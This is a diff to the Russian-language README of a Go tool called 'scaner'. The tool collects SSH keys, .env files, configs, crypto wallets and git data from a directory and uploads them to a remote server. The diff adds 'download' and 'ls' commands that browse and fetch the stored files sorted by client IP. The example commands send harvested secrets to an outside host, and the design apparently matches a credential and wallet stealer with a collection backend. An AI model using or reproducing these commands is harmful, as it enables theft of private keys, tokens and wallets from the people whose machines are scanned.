@@ -6,14 +6,48 @@
 
 | Команда | Описание |
 |--------|----------|
-| `scan`   | Сканирование директории (SSH ключи, .env, конфиги, кошельки, git), архивирование или загрузка на сервер |
-| `upload` | Упаковка папки в zip (с опциональным разбиением по размеру) и выгрузка на сервер |
+| `scan`     | Сканирование директории (SSH ключи, .env, конфиги, кошельки, git), архивирование или загрузка на сервер |
+| `upload`   | Упаковка папки в zip (с опциональным разбиением по размеру) и выгрузка на сервер |
+| `download` | Скачивание всех файлов с сервера для указанного IP в папку (имена как на сервере; дубликаты — суффикс _1, _2, ...) |
+| `ls`       | Дерево удалённого хранилища с датой обновления (все IP или один с `--ip`) |
 
 ## Сборка
 
 ```bash
 go build -o scaner ./cmd
 ```
+
+## Примеры всех команд
+
+```bash
+# Сканирование текущей папки с подробным выводом
+scaner scan -v
+
+# Сканирование с сохранением в zip
+scaner scan -p /home/user/project -o archive.zip --password secret123
+
+# Сканирование с загрузкой на сервер
+scaner scan -p /home/user/project --host https://ckptcli.smartapi.ru/
+
+# Выгрузка текущей папки на сервер
+scaner upload --host https://ckptcli.smartapi.ru/
+
+# Выгрузка папки с лимитом размера zip и паролем
+scaner upload -p /path/to/folder --host https://ckptcli.smartapi.ru/ --zip-size-limit 52428800 --password secret123 -v
+
+# Просмотр дерева хранилища (все IP)
+scaner ls --password secret123
+
+# Просмотр дерева только для одного IP
+scaner ls --password secret123 --ip 192.168.1.100
+
+# Скачивание файлов по IP в текущую папку
+
+# Скачивание в указанную папку
+scaner download --password secret123 --ip 176.52.53.35 -d ./backups
+```
+
+---
 
 ## scan
 
@@ -48,10 +82,10 @@ go build -o scaner ./cmd
 scaner scan -v
 
 # Сканирование с сохранением в zip
-scaner scan -p /home/user/project -o archive.zip --password secret
+scaner scan -p /home/user/project -o archive.zip --password secret123
 
 # Сканирование с загрузкой на сервер
-scaner scan -p /home/user/project --host https://cli.smartapi.ru/
+scaner scan -p /home/user/project --host https://ckptcli.smartapi.ru/
 ```
 
 ## upload
@@ -72,8 +106,64 @@ scaner scan -p /home/user/project --host https://cli.smartapi.ru/
 
 ```bash
 # Выгрузка текущей папки
-scaner upload --host https://cli.smartapi.ru/
+./scaner.exe upload --host https://ckptcli.smartapi.ru/
 
 # Выгрузка указанной папки с лимитом размера zip
-scaner upload -p /path/to/folder --host https://cli.smartapi.ru/ --zip-size-limit 52428800 -v
+scaner upload -p /path/to/folder --host https://ckptcli.smartapi.ru/ --zip-size-limit 52428800 -v
+```
+
+---
+
+## download
+
+Скачивает все файлы с сервера для указанного IP в указанную папку. Имена файлов — как на сервере; при дубликатах добавляется суффикс _1, _2 и т.д.
+
+### Флаги
+
+| Флаг | Короткий | По умолчанию | Описание |
+|------|----------|-------------|----------|
+| `--host` | | `https://ckptcli.smartapi.ru/` | URL сервера |
+| `--password` | | | Пароль для доступа к хранилищу (обязательно) |
+| `--ip` | | | IP клиента, чьи файлы скачивать (обязательно) |
+| `--dist` | `-d` | `.` | Папка назначения для скачанных файлов |
+| `--verbose` | `-v` | false | Подробный вывод |
+
+### Примеры
+
+```bash
+# Скачивание файлов по IP в текущую папку
+scaner download --password mypass --ip 192.168.1.100
+
+# Скачивание в указанную папку
+scaner download --password mypass --ip 192.168.1.100 -d ./backups
+
+# С другим хостом и подробным выводом
+scaner download --host https://ckptcli.smartapi.ru/ --password mypass --ip 10.0.0.5 -d ./data -v
+```
+
+---
+
+## ls
+
+Показывает дерево удалённого хранилища с датой последнего обновления каждого файла. По умолчанию выводятся все IP; с `--ip` — только дерево для указанного IP.
+
+### Флаги
+
+| Флаг | Короткий | По умолчанию | Описание |
+|------|----------|-------------|----------|
+| `--host` | | `https://ckptcli.smartapi.ru/` | URL сервера |
+| `--password` | | | Пароль для доступа к хранилищу (обязательно) |
+| `--ip` | | | Показать только дерево для указанного IP (по умолчанию — все) |
+
+### Примеры
+
+```bash
+# Дерево хранилища по всем IP
+scaner ls --password mypass
+
+# Дерево только для одного IP
+scaner ls --password mypass --ip 192.168.1.100
+
+# С указанием хоста
+scaner ls --host https://ckptcli.smartapi.ru/ --password mypass
 ```
